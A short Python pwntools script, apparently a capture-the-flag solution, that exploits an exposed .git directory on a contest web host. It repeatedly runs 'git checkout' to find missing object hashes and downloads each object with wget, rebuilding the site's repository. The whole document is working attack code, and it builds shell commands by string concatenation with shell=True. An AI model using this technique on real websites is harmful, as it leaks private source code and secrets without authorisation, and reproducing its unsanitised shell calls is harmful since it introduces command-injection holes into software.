from pwn import *

URL = "http://xdsec-cms-12023458.xdctf.win/.git/objects/"

p = process("git checkout HEAD~", shell=True)
res = p.recvall()
temp = res.split("\n")
for i in temp:
    res = (i.split()[-1].strip("()"))
    directory = res[:2]
    hash_file = res[2:]
    process("mkdir .git/objects/" + directory, shell=True)
    command = "wget -O .git/objects/" + directory + "/" + hash_file + " " + URL + directory + "/" + hash_file
    p = process(command, shell=True)
